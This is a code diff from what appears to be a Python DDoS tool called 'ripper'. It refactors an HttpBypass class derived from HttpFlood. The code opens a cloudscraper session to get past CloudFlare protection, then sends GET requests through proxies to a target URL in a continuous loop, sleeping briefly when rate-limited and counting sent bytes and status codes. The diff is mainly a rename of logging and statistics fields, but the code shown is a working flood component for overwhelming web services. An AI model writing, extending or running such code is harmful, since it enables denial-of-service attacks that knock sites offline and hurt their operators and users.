@@ -11,7 +11,7 @@ from ripper.context.events_journal import EventsJournal
 # Forward Reference
 Context = 'Context'
 
-Events = EventsJournal()
+events = EventsJournal()
 
 
 class RateLimitException(BaseException):
@@ -49,30 +49,30 @@ class HttpBypass(HttpFlood):
             'desktop': False
         }
         with suppress(Exception), create_scraper(browser=browser) as self._http_connect:
-            self._ctx.target.statistic.connect.status_success()
-            Events.info('Creating CloudFlare scraper connection.')
+            self._target.stats.connect.status_success()
+            events.info('Creating CloudFlare scraper connection.')
             while self.send(self._http_connect):
                 if self._ctx.dry_run:
                     break
                 continue
-            self._ctx.target.statistic.connect.status_failed()
+            self._target.stats.connect.status_failed()
 
     def send(self, scraper: CloudScraper):
         try:
             with scraper.get(self._target.url(),
                              headers=self._ctx.headers_provider.headers,
                              proxies=self._proxy) as response:
-                self._ctx.target.statistic.http_stats[response.status_code] += 1
+                self._target.stats.http_stats[response.status_code] += 1
                 self.check_rate_limit(response)
         except RateLimitException as e:
-            Events.warn(f'{type(e).__name__} {e.__str__()}, sleep for 3 sec')
+            events.warn(f'{type(e).__name__} {e.__str__()}, sleep for 3 sec')
             time.sleep(3.01)
             return True
         except Exception as e:
-            Events.exception(e)
+            events.exception(e)
         else:
             sent_bytes = self._size_of_request(response.request)
-            self._ctx.target.statistic.packets.status_sent(sent_bytes)
+            self._target.stats.packets.status_sent(sent_bytes)
             self._proxy.report_success() if self._proxy is not None else 0
             return True
         return False
